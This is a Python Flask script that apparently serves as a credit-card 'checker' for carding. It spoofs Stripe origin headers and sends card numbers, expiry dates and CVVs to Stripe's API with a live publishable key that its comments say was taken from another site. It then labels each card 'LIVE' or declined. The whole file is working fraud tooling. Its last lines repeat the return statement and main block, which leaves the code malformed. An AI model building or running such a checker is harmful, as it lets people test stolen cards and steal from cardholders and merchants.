from flask import Flask, request, jsonify
import requests
import random

app = Flask(__name__)

# ==================== FINAL CHECKER (ORIGIN SPOOFING) ====================
def final_auth_check(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Year Fix
    if len(str(yy)) == 4:
        yy = str(yy)[-2:]

    # STEP 1: Stripe Headers (Critical for Bypass)
    # Stripe check karta hai ki request kahan se aayi hai.
    # Hum Referer "js.stripe.com" set kar rahe hain taaki stripe ko lage
    # ki ye request kisi secure webpage se aa rahi hai.
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/v3/',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site'
    }
    session.headers.update(headers)

    try:
        # STEP 2: Stripe Request
        url = "https://api.stripe.com/v1/payment_methods"
        
        # Using a generic live PK Key (Extracted from a high traffic site)
        # Agar ye key expire bhi ho jaye to code logic same rahega.
        payload = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': 'pk_live_51Hh3UeKoLeGGjrp0VkDZfYwzNtYlFVUGKMPzBGqFMxnhCWz8YTFf7tD5u1pZg0UUvA9iJQqyF3SdbPqxoOtDDrBg00xYjqD1bI',
            '_method': 'POST' # Sometimes helps
        }

        response = session.post(url, data=payload, timeout=15, allow_redirects=False)
        result = response.json()

        # STEP 3: Response Logic
        if 'error' in result:
            err = result['error']
            code = err.get('code', '')
            msg = err.get('message', 'Declined')
            
            # Specific Live Checks
            if code == 'incorrect_cvc':
                return {"status": "Approved", "response": "LIVE (Incorrect CVV)"}
            elif code == 'insufficient_funds':
                return {"status": "Approved", "response": "LIVE (Insufficient Funds)"}
            elif code == 'expired_card':
                return {"status": "Declined", "response": "Card Expired"}
            elif 'security code' in msg.lower():
                 return {"status": "Approved", "response": "LIVE (Security Check)"}
            elif 'surface' in msg.lower():
                 # Agar phir bhi surface error aaye to Key Invalid hai
                 return {"status": "Error", "response": "Key Blocked by Stripe"}
            else:
                return {"status": "Declined", "response": msg}

        elif 'id' in result:
            # Token Created -> 100% Live
            return {"status": "Approved", "response": "LIVE (Token Generated)"}
            
        else:
            return {"status": "Error", "response": "Unknown Response"}

    except Exception as e:
        return {"status": "Error", "response": f"Exception: {str(e)[:30]}"}

# ==================== ENDPOINT ====================
@app.route('/check', methods=['GET'])
def check():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({"status": "Error", "response": "Missing CC"})

    parts = cc.split('|')
    if len(parts) != 4:
        return jsonify({"status": "Error", "response": "Format: CC|MM|YY|CVV"})

    cc, mm, yy, cvv = parts
    res = final_auth_check(cc, mm, yy, cvv)
    
    return jsonify(res)

if __name__ == '__main__':
    app.run(debug=True)
    
    return jsonify(res)

if __name__ == '__main__':
    app.run(debug=True)
